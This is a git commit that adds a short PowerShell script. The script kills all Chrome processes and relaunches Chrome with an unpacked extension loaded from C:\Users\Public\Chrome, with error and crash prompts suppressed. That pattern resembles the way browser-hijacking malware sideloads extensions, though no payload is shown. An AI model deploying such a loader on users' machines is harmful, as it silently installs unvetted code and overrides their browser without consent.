d67c0cdb1cba56bcf87ddf1147f42b4c449157b2
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-06 11:05:57 +0530

    Add files via upload

---
+++ hi.ps1
@@ -0,0 +1,20 @@
+$extPath = "C:\Users\Public\Chrome"
+
+# Terminate all running instances of Chrome, if any
+Get-Process -Name chrome -ErrorAction SilentlyContinue | ForEach-Object {
+    $_.Kill()
+}
+
+# Check if the extension directory exists
+if (Test-Path -Path $extPath) {
+    # Start Chrome with the extension
+    try {
+        Start-Process chrome "--load-extension=`"$extPath`", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble" -ErrorAction Stop
+    } catch {
+        # If an error occurs while starting Chrome, display the error message
+        $_
+    }
+} else {
+    # If the extension directory does not exist, display a message
+    "Extension directory not found."
+}
